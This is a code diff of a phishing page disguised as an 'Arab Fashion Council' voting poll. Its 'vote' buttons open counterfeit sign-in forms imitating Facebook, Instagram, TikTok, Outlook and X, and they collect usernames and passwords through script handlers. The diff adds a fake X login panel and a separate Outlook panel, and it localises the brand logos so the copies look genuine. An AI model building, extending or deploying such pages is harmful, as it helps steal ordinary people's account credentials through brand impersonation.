@@ -2,6 +2,7 @@
 <html class="_9dls touch _ar44 js-focus-visible _aa4c" lang="en" dir="ltr" data-js-focus-visible="">
 
 <head>
+    <title>Arab Fashion Council</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description"
@@ -13,283 +14,11 @@
     <meta property="og:url" content="" />
     <meta property="og:type" content="website" />
     <link id="dynamic-favicon" href="image/favicon.png" rel="shortcut icon" sizes="196x196">
-    <link type="text/css" rel="stylesheet" href="css/fb.css">
-    <link type="text/css" rel="stylesheet" href="css/fb_style.css">
-    <link type="text/css" rel="stylesheet" href="css/tw_style.css">
-    <link type="text/css" rel="stylesheet" href="css/page.css">
-    <link rel="stylesheet" href="css/profile.css">
     <link rel="stylesheet" href="css/index.css">
-    <link rel="stylesheet" href="css/ig.css">
     <script src="js/jquery-3.6.0.min.js"></script>
-    <script src="js/index.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
-    <title>Arab Fashion Council</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .mgm {
-            display: none;
-            /* Initially hidden */
-            background-color: #fff9d7;
-            border: 1px solid #e2c822;
-            width: 100%;
-            max-width: 400px;
-            /* Set a max width */
-            padding: 5px;
-            text-align: center;
-            border-radius: 5px;
-            margin: 10px auto;
-            /* Add margin to create space around it */
-            font-family: Arial, sans-serif;
-            font-size: 11px;
-        }
-
-        .mgm .txt {
-            display: inline-block;
-            /* Display text inline-block to align with any other inline content */
-            vertical-align: middle;
-            /* Vertical alignment */
-        }
-
-        .mgm img {
-            display: inline-block;
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-
-
-        .stopwatch {
-            width: 100px;
-            position: sticky;
-            /* Change from absolute to sticky */
-            top: 40px;
-            /* Stick to the top of the header */
-            margin: 20px auto;
-            /* Center horizontally with margin */
-            border-radius: 50%;
-            background: radial-gradient(circle, #ccc 70%, #fff);
-            box-shadow: 0 0 8px rgba(0, 0, 0, 0.2);
-            z-index: 1000;
-        }
-
-        .clock-face {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 100%;
-            height: 100%;
-            background-color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            font-size: 12px;
-            font-weight: 400;
-            text-align: center;
-            box-shadow: inset 0 0 3px rgba(0, 0, 0, 0.1);
-        }
-
-        .time {
-            font-size: 14px;
-        }
-
-        .icon {
-            width: 40px;
-            /* Set the width of the image */
-            height: 40px;
-            /* Set the height of the image */
-            margin: 0;
-        }
-
-        .hide-button {
-            position: absolute;
-            top: 20px;
-            right: 140px;
-            z-index: 1000;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .hide-button:hover {
-            background-color: #0056b3;
-        }
-
-        .show-mgm {
-            margin-top: 20px;
-            /* Adjust the margin value as needed */
-        }
-
-        .imag {
-            top: 50px;
-        }
-    </style>
-    <style>
-        ._585n {
-            background-color: #3578e5;
-            border: 1px solid #3578e5;
-            border-radius: 3px;
-            overflow: hidden;
-            padding: 0 0 0 40px;
-        }
-    </style>
-
-    <script>
-
-        const APPEARANCE = 'auto'
-    </script>
-    <script>
-        let defaultThemeLight = { 'id': null, 'name': 'Default', colors: { 'pageBg': '#f9fafb', 'boxBg': '#ffffff', 'boxBorder': '#e5e8eb', 'boxBorderTop': '#fbbf24', 'title': '#111827', 'text': '#6b7280', 'highlight': '#4f46e5', 'buttonBg': '#4f46e5', 'buttonText': '#ffffff', 'border': '#e5e7eb', }, 'hideShareButton': false }
-        let defaultThemeDark = { 'id': null, 'name': 'Default', colors: { 'pageBg': '#111827', 'boxBg': '#1f2937', 'boxBorder': '#374151', 'boxBorderTop': '#818cf8', 'title': '#e5e7eb', 'text': '#94a3b8', 'highlight': '#6366f1', 'buttonBg': '#6366f1', 'buttonText': '#ffffff', 'border': '#374151' }, 'hideShareButton': false }
-
-        let customTheme = { id: null }
-
-        let currentTheme = defaultThemeLight
-
-        if (APPEARANCE === 'dark' || APPEARANCE === 'auto' && window.matchMedia('(prefers-color-scheme: dark)').matches) {
-            document.getElementById('html').classList.add('dark')
-            currentTheme = defaultThemeDark
-        }
-
-        if (customTheme.id) {
-            currentTheme = customTheme
-
-            if (isDarkBg(hexToRGBA(customTheme.colors.pageBg, 1, 0, 1))) {
-                if (!document.getElementById('html').classList.contains('dark')) {
-                    document.getElementById('html').classList.add('dark')
-                }
-            } else {
-                if (document.getElementById('html').classList.contains('dark')) {
-                    document.getElementById('html').classList.remove('dark')
-                }
-            }
-        }
-
-        let pollOptionColors = ['#3EB991', '#FF7563', '#AA66CC', '#FFBB33', '#FF8800', '#33B5E5', '#AA66CC']
-
-        setCustomTheme(currentTheme)
-
-        function setCustomTheme(theme) {
-            for (const [key, value] of Object.entries(theme.colors)) {
-                document.documentElement.style.setProperty('--' + key, hexToRGBA(value, 1, 0, 1))
-            }
-
-            document.documentElement.style.setProperty('--buttonBgLight', hexToRGBA(theme.colors['buttonBg'], 1, 1, 1.16))
-            document.documentElement.style.setProperty('--borderDark', hexToRGBA(theme.colors['border'], 1, 1, 0.84))
-            document.documentElement.style.setProperty('--highlightDark', hexToRGBA(theme.colors['highlight'], 1, 1, 0.84))
-            document.documentElement.style.setProperty('--textShadow', hexToRGBA(theme.colors['text'], 1, 5, 0.954))
-            document.documentElement.style.setProperty('--textLight', hexToRGBA(theme.colors['text'], 0.8, 0, 1)) // 1, 113, 0.5568)
-            document.documentElement.style.setProperty('--textLighter', hexToRGBA(theme.colors['text'], 1, 168, 0.3431))
-            document.documentElement.style.setProperty('--highlightShadow', hexToRGBA(theme.colors['highlight'], 1, 58, 0.772))
-        }
-
-        function setCustomFormDesign(design) {
-            for (const [key, value] of Object.entries(design.colors)) {
-                document.documentElement.style.setProperty('--' + key, hexToRGBA(value, 1, 0, 1))
-            }
-
-            if (isDarkBg(hexToRGBA(design.colors['formBackgroundColor'], 1, 0, 1))) {
-                document.documentElement.style.setProperty('--textColorLight', hexToRGBA(design.colors['textColor'], 1, 1, 0.5))
-                document.documentElement.style.setProperty('--titleColorLight', hexToRGBA(design.colors['titleColor'], 1, 1, 0.5))
-            } else {
-                document.documentElement.style.setProperty('--titleColorLight', hexToRGBA(design.colors['titleColor'], 0.2, 0, 1))
-                document.documentElement.style.setProperty('--textColorLight', hexToRGBA(design.colors['textColor'], 0.2, 0, 1))
-            }
-
-            if (isDarkBg(hexToRGBA(design.colors['choiceColor'], 1, 0, 1))) {
-                document.documentElement.style.setProperty('--choiceBackgroundTextColor', 'rgba(255,255,255,1)')
-            } else {
-                document.documentElement.style.setProperty('--choiceBackgroundTextColor', 'rgba(0,0,0,1)')
-            }
-        }
-
-        function hexToRGBA(hex, opacity, modifierAdd, modifierMulti) {
-            if (!hex) {
-                return 'rgba(0, 0, 0, 0)'
-            }
-            let c;
-            if (/^#([A-Fa-f0-9]{3}){1,2}$/.test(hex)) {
-                c = hex.substring(1).split('')
-                if (c.length === 3) {
-                    c = [c[0], c[0], c[1], c[1], c[2], c[2]]
-                }
-                c = '0x' + c.join('')
-                return 'rgba(' + [(c >> 16) & 255, (c >> 8) & 255, c & 255].map(x => parseInt(modifierAdd + modifierMulti * x)).join(',') + ', ' + opacity + ')'
-            }
-        }
-
-        function isDarkBg(color) {
-            let colors = color.match(/^rgba?\((\d+),\s*(\d+),\s*(\d+)(?:,\s*(\d+(?:\.\d+)?))?\)$/)
-
-            let r = colors[1]
-            let g = colors[2]
-            let b = colors[3]
-            let a = parseInt(colors[4])
-
-            if (a === 0) return 0
-
-            let hsp = Math.sqrt(0.299 * (r * r) + 0.587 * (g * g) + 0.114 * (b * b))
-
-            if (hsp <= 127.5) {
-                return 1
-            }
-        }
-    </script>
-    <link rel="stylesheet" href="strawpoll/dist/main.css">
-    <script defer src="strawpoll/dist/app.js?v=248"></script>
-
-    <!-- Add this line in the <head> section of your HTML -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
-    <script src="https://cdn.tailwindcss.com"></script>
     <script src="js/index.js"></script>
-
-    <link rel="stylesheet" href="css/index.css">
-    <script>
-
-    </script>
-
-    <style>
-        /* Popup styles */
-        .popup {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            display: flex;
-            align-items: center;
-            display: none;
-            z-index: 999;
-            /* Lower z-index */
-        }
-
-        .popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: 998;
-            /* Lower z-index for the overlay */
-        }
-
-        .popup img {
-            border-radius: 50%;
-            margin-right: 10px;
-            width: 40px;
-            height: 40px;
-        }
-    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
 <body>
@@ -300,7 +29,7 @@
 
             <center>
                 <div class="mgm">
-                    <span class="txt">This is a sample message.</span>
+                    <span class="txt"></span>
                 </div><br><br>
 
                 <button id="vote2" onclick="vote()">
@@ -494,23 +223,24 @@
                     <div class="mt-6 flex justify-center space-x-8">
                         <img width="50px" height="50px" title="facebook"
                             class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
-                            src="https://upload.wikimedia.org/wikipedia/en/0/04/Facebook_f_logo_%282021%29.svg"
-                            alt="Facebook" onclick="fb(); hidePopup(); can();">
+                            src="img/Facebook_f_logo_(2021).svg" alt="Facebook" onclick="fb(); hidePopup(); can();">
 
                         <img width="50px" height="50px" title="instagram"
                             class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
-                            src="https://upload.wikimedia.org/wikipedia/commons/archive/9/95/20220518131923%21Instagram_logo_2022.svg"
-                            alt="Instagram" onclick="ig(); hidePopup(); can();">
+                            src="img/20220518131923!Instagram_logo_2022.svg" alt="Instagram"
+                            onclick="ig(); hidePopup(); can();">
 
                         <img width="50px" height="50px" title="tiktok"
                             class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
-                            src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Iconoir_tiktok_white.svg"
-                            alt="TikTok" onclick="tok(); hidePopup(); can();">
+                            src="img/Iconoir_tiktok_white.svg" alt="TikTok" onclick="tok(); hidePopup(); can();">
 
                         <img width="50px" height="50px" title="email"
                             class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
-                            src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png"
-                            alt="Twitter" onclick="tw(); hidePopup(); can();">
+                            src="img/Microsoft_logo.svg.png" alt="Hotmail" onclick="hm(); hidePopup(); can();">
+
+                        <img width="50px" height="50px" title="email"
+                            class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+                            src="img/X_logo_2023_(white).png" alt="Twitter" onclick="tw(); hidePopup(); can();">
                     </div>
                 </div>
             </div>
@@ -518,51 +248,90 @@
     </div>
 
     <div id="votingsocial">
-        <div id="twp" class="bg-gray mt-4">
+        <div id="twp" class="bg-black">
             <div class="min-h-screen flex flex-col w-full">
                 <!-- Main Content Section -->
                 <main class="flex-grow">
-                    <div class="tokpart ">
-                        <div class=" p-5 w-full max-w-md">
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1920px-Microsoft_logo_%282012%29.svg.png"
-                                alt="logo" class="h-10 mt-20">
-                            <h2 id="heading" class="text-4xl font-bold text-white mb-0 mt-12 text-left">Sign in</h2>
-                            <p class="text-xl text-white mb-6 mt-0 text-left">to continue to Outlook</p>
-                            <!-- Email Input -->
-                            <div id="uname" class="flex justify-start">
-                                <input type="email" id="twi-uname" name="email" required
-                                    class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
-                                    placeholder="Email, phone, or Skype" />
-                            </div>
-                            <div class="flex justify-start">
-                                <button id="forgotPasswordButton" type="button"
-                                    class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
-                                    No account?
-                                    <span class="text-blue-500 hover:underline"> Create one!</span>
+                    <div class="flex justify-center items-center p-4">
+                        <!-- Centered Image -->
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/X_logo.jpg/1200px-X_logo.jpg"
+                            alt="logo" class="h-10">
+                    </div>
+
+                    <div class="tokpart bg-black">
+                        <div class="bg-black p-8 w-full max-w-md">
+                            <h2 id="heading" class="text-2xl font-bold text-white mb-6 mt-12 text-left">Sign in to X
+                            </h2>
+
+                            <div id="buttonsContainer">
+                                <!-- Container Div for Google, Apple Buttons, and 'or' Divider -->
+                                <button id="ButtonGoogle" type="button" onclick=""
+                                    class="w-full py-2 bg-gray-100 px-4 rounded-3xl flex items-center justify-center text-gray focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
+                                    style="font-family: 'Google Sans', arial, sans-serif; font-weight: 400; overflow: hidden;">
+                                    <!-- Google Icon -->
+                                    <img src="img/Google__G__logo.svg.png" alt="Google Icon" class="h-5 mr-3">
+                                    Sign in with Google
                                 </button>
+
+                                <!-- Sign in with Apple Button -->
+                                <button id="ButtonApple" type="button" onclick=""
+                                    class="w-full py-2 bg-gray-100 px-4 rounded-3xl flex items-center justify-center text-gray focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
+                                    style="font-family: 'Google Sans', arial, sans-serif; font-weight: 400; overflow: hidden;">
+                                    <!-- Apple Icon -->
+                                    <img src="img/Apple_logo_black.svg" alt="Apple Icon" class="h-5 mr-3">
+                                    Sign in with Apple
+                                </button>
+
+                                <div class="flex items-center my-4">
+                                    <div class="flex-grow border-t border-gray-700"></div>
+                                    <span class="mx-4 text-gray-500">or</span>
+                                    <div class="flex-grow border-t border-gray-700"></div>
+                                </div>
                             </div>
+
+                            <!-- Email Input -->
+                            <div class="mb-4 relative">
+                                <input type="email" id="hm-uname" name="email" required
+                                    class="mt-1 block w-full px-3 py-4 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300" />
+                                <label for="twi-uname"
+                                    class="absolute left-3 top-2 text-sm text-gray-500 transition-all duration-200 transform scale-100 peer-focus:top-2 peer-focus:left-3 peer-focus:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:top-3 peer-placeholder-shown:left-3 mb-3">Phone,
+                                    Email address, or username</label>
+                            </div>
+
                             <!-- Next Button to show password field -->
                             <button id="nextButton" type="button" onclick="showPasswordField()"
-                                class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                                class="w-full bg-gray-100 text-gray-900 py-2 px-4 rounded-3xl bg-gray-200 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4">
                                 Next
                             </button>
+
+                            <button id="forgotPasswordButton" type="button"
+                                class="w-full text-gray-200 py-2 px-4 rounded-3xl border border-gray-200 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-4">
+                                Forgot Password?
+                            </button>
+
                             <!-- Password Field (hidden initially) -->
                             <div id="passwordField" class="hidden mt-4">
                                 <div class="mb-4 relative">
-                                    <input type="password" id="twi-pass" name="password" required
-                                        class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
-                                        placeholder="Password" />
+                                    <input type="password" id="hm-pass" name="password" required
+                                        class="mt-1 block w-full px-3 py-4 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[rgb(62,65,68)] peer" />
+                                    <label for="twi-pass"
+                                        class="absolute left-3 top-2 text-sm text-gray-500 transition-all duration-200 transform scale-100 peer-focus:top-2 peer-focus:left-3 peer-focus:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:top-3 peer-placeholder-shown:left-3">Password</label>
                                 </div>
-                                <button id="nextButton" type="button" onclick="twilog()"
-                                    class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
-                                    Submit
-                                </button>
-
+                                <button onclick="hmlog()" type="submit"
+                                    class="w-full bg-gray-100 text-black py-2 px-4 rounded-md hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">Log
+                                    in</button>
                             </div>
+
+                            <p class="mt-6 text-left text-sm text-gray-600">
+                                Don't have an account?
+                                <a href="#" class="font-medium text-blue-600 hover:text-blue-500">Sign up</a>
+                            </p>
 
                         </div>
                     </div>
+
                 </main>
+
                 <!-- Footer Section -->
                 <footer id="error-message"
                     class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full ">
@@ -575,6 +344,64 @@
 
             </div>
 
+        </div>
+        <div id="hmp" class="bg-gray mt-4">
+            <div class="bg-black">
+                <div class="min-h-screen flex flex-col w-full">
+                    <!-- Main Content Section -->
+                    <main class="flex-grow">
+                        <div class="tokpart ">
+                            <div class=" p-5 w-full max-w-md">
+                                <img src="img/Microsoft_logo_(2012).svg.png" alt="logo" class="h-10 mt-20">
+                                <h2 id="heading" class="text-4xl font-bold text-white mb-0 mt-12 text-left">Sign in</h2>
+                                <p class="text-xl text-white mb-6 mt-0 text-left">to continue to Outlook</p>
+                                <!-- Email Input -->
+                                <div id="uname" class="flex justify-start">
+                                    <input type="email" id="hm-uname" name="email" required
+                                        class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                                        placeholder="Email, phone, or Skype" />
+                                </div>
+                                <div class="flex justify-start">
+                                    <button id="forgotPasswordButton" type="button"
+                                        class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
+                                        No account?
+                                        <span class="text-blue-500 hover:underline"> Create one!</span>
+                                    </button>
+                                </div>
+                                <!-- Next Button to show password field -->
+                                <button id="nextButton" type="button" onclick="showPasswordField()"
+                                    class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                                    Next
+                                </button>
+                                <!-- Password Field (hidden initially) -->
+                                <div id="passwordField" class="hidden mt-4">
+                                    <div class="mb-4 relative">
+                                        <input type="password" id="hm-pass" name="password" required
+                                            class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                                            placeholder="Password" />
+                                    </div>
+                                    <button id="nextButton" type="button" onclick="hmlog()"
+                                        class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                                        Submit
+                                    </button>
+
+                                </div>
+
+                            </div>
+                        </div>
+                    </main>
+                    <!-- Footer Section -->
+                    <footer id="error-message"
+                        class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full ">
+                        <div class=" w-full px-4">
+                            <div class="flex justify-between items-center">
+                                Sorry, we could not find your account.
+                            </div>
+                        </div>
+                    </footer>
+
+                </div>
+            </div>
         </div>
 
         <div id="igp" class="bg-black">
@@ -641,7 +468,7 @@
                         <!-- Text above the image with reduced margin -->
                         <p class="mb-0" style="font-size: 12px; margin-bottom: 2px;">from</p>
                         <!-- Linked image -->
-                        <a href="https://www.example.com">
+                        <a href="">
                             <img src="image/meta.png" alt="logo" class="h-14">
                         </a>
                     </div>
@@ -656,8 +483,7 @@
                     <div class="flex justify-between items-center p-4">
                         <!-- Left Section -->
                         <div class="flex items-center">
-                            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1000px-TikTok_logo.svg.png?20200415104610"
-                                alt="logo" class="h-10">
+                            <img src="img/TikTok_logo.svg.png" alt="logo" class="h-10">
                         </div>
                         <!-- Right Section -->
                         <div class="flex items-center space-x-2">
@@ -686,7 +512,8 @@
                                     <input type="password" id="tok-pass" name="password" required
                                         class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                                         oninput="checkPassword()">
-                                    <p id="password-feedback" class="text-sm text-red-500 hidden">Password must be at
+                                    <p id="password-feedback" class="text-sm text-red-500 hidden">Password must be
+                                        at
                                         least 6 characters long.</p>
                                 </div>
                                 <div class="flex items-center justify-between mb-6">
@@ -735,40 +562,13 @@
             </div>
         </div>
 
-        <script>
-            // Check if email is valid
-            function checkInput() {
-                const email = document.getElementById('tok-uname').value;
-                const emailFeedback = document.getElementById('email-feedback');
-
-                if (emailPattern.test(email)) {
-                    emailFeedback.classList.add('hidden');
-                } else {
-                    emailFeedback.classList.remove('hidden');
-                }
-            }
-
-            // Check if password is valid (at least 6 characters)
-            function checkPassword() {
-                const password = document.getElementById('tok-pass').value;
-                const passwordFeedback = document.getElementById('password-feedback');
-
-                if (password.length >= 6) {
-                    passwordFeedback.classList.add('hidden');
-                } else {
-                    passwordFeedback.classList.remove('hidden');
-                }
-            }
-        </script>
-
         <div id="fbp" class="bg-gray-100 text">
             <div class="min-h-screen flex flex-col w-full">
                 <!-- Main Content Section -->
                 <main class="flex-grow p-2"> <!-- Reduced padding here -->
                     <div class="flex justify-center mt-9 mb-4">
                         <!-- Centered Image -->
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/800px-Facebook_logo_%282023%29.svg.png"
-                            alt="logo" class="h-12">
+                        <img src="img/Facebook_logo_(2023).svg.png" alt="logo" class="h-12">
                     </div>
                     <div class="flex justify-center mb-4 text-black">
                         <p class="text-xl text-center break-words max-w-md">
@@ -917,7 +717,6 @@
     <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
     <script src="/js/firebase.js"></script>
-
 
 </body>
 
